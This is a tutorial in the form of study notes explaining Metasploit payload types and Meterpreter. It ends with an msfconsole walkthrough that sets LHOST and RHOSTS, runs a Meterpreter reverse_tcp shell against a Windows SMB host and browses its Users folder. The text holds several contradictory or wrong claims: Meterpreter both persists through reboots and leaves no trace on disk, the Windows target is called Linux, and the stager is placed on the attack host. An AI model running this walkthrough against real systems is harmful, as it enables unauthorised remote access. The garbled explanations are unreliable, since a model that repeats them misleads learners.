# Metasploit Payloads

A #Metasploit #Payload is a supplemental module that initiates a shell on a remote host that an attacker can use to access it. This is often sent in tandem with an exploit module to infiltrate a vulnerable service to establish a reverse connection on the target host.

If the payload is staged, there will be a / present in its name between the payload type and the payload name. For example, the payload windows/shell_bind_tcp is unstaged whereas windows/shell/bind_tcp is staged. 

### Payload Types

There are three types of payloads in the Metasploit Framework: Singles, Stagers, and Stages.

#### Singles

A single payload contains an exploit and the shell code for it to serve as an all-in-one solution that is more stable than other types. These are alternatively known as self-contained payloads and offer immediate results after execution. 

#### Stagers

Stagers work in conjunction with Stages payloads to perform a specific task. They are installed on the target host and wait for communication from a stage that has performed a task on the same target. They are used to establish a connection to the target host and are small compared to singles. 

#### Stages

Stages are components of payloads that are downloaded by the stagers and provide added functionality like Meterpreter, #VNC injection, and other tools. The stages use the stagers. 

### Staged Payloads

Staged payloads are modular exploitation methods that are functionally segregated to ensure separation of the different functions. It divides the payload into different code blocks that work individually but chain the attack together when working as a whole. The end goal is to grant unauthorized access to the target host. 

These payloads are designed to be compact and intended to be a discreet method of connecting with the intention of avoiding anti-virus ( #AV) tools and Intrusion Prevention Systems ( #IPS).

Stage0 represents the shellcode transmitted to the target host to form the reverse connection. Payloads will refer to these reverse shells as reverse_tcp, reverse_https, and bind_tcp. 

Use the following command within the #msfconsole to view the available payloads:

>show payloads

When a reverse shell is established, it will be contained within the security trust zone and it often triggers Intrusion Detection Systems ( #IDS) or Intrusion Prevention Systems ( #IPS).

### Meterpreter Payloads

#Meterpreter is a multi-faceted payload that uses #DLL injection to stabilize reverse shells. It is difficult for security tools to detect and persists through system reboots of the target host. It is stored within the memory leaving no evidence of its existence on the storage devices of the target host with the ability to dynamically load scripts and plugins. 

After Meterpreter is executed you will have access to the interface, which is similar to msfconsole. It is capable of keystroke capture, password hash collection, microphone tapping, screenshotting, and imitating security tokens and cookies. It is most often used to install and load plugins on the target host.

### Searching

In the example given, we will be seeking the Meterpreter Payload for Windows 7 (x64). There are many options for this module, so we will need to narrow down our search using #grep. 

We can begin by using grep to find all related Meterpreter modules with the following command:

>grep meterpreter show payloads
>grep -c meterpreter show payloads

These commands will return 14 payloads. We can use the following command to narrow our search to reverse_tcp:

>grep meterpreter grep reverse_tcp show payloads
>grep -c meterpreter grep reverse_tcp show payloads

This should have reduced the list of payloads to only three results, which is much more managable.

### Selecting Payloads

We will need to determine the payload we want to use by looking through the options related to each module. We can then set the payload using the index number \<no.>. 

Use the following sequence of commands to achieve this:

>show options
>grep meterpreter grep reverse_tcp show payloads
>set payload 15

This should set the reverse_tcp payload as our active module. We should then review the options for this module:

>show options

When we are within the payload module - we can use the show payloads command to view the payloads that are known to work on our target host. In this case it is a windows machine so the module will display payloads related to that #OS. 

A new option field should be present with our more specific results related to the payload parameters. 

We will need to set the newly presented parameters LHOST and LPORT to utilize our payload.

### Using Payloads

We will need to set the following parameters for the target host and our own machine:

- RHOSTS - the #IP address of the target host.
- RPORT - the designated port of the target host - in this case the default value 445 for #SMB is correct.
- LHOST - the attack host's IP address. Use the 'ifconfig' command to find this value.
- LPORT - the attack host's designated port - there should be no port assigned by default which is correct in our case.

### Configuration of Payload and Exploit

Use the following sequence of commands to configure our parameters:

>ifconfig

After learning our attack host IP address 10.10.10.10 :

>set LHOST 10.10.10.10
>set RHOSTS 69.69.69.69
>run

This should successfully establish a reverse shell with Meterpreter on the target host. We can then try running commands to learn the username. Since this is a #Linux based host, use the getuid command:

>getuid

We can also seek further explanation about the Meterpreter interface by using the help command:

>help

This will reveal a very long list of commands and features with descriptions about how they are implemented and what they do through the Meterpreter command-line interface ( #CLI).

### Navigation

We usually want to see information about the Users on the target host. We can see more information by navigating to the Users directory with the following command:

>cd Users
>ls
>shell

The shell command will create Channel 1 which will place us into the CLI of the target host. The channel represents our connection established between our attack host and the target host which is  a reverse #TCP connection facilitated by the Meterpreter Stager and Stage. We activated the stager on our attack host, which waited for a response from the stage payload on the target host. We now have a reverse shell to work from. Meterpreter can also navigate and execute on the target without this shell with the same level of privilege.

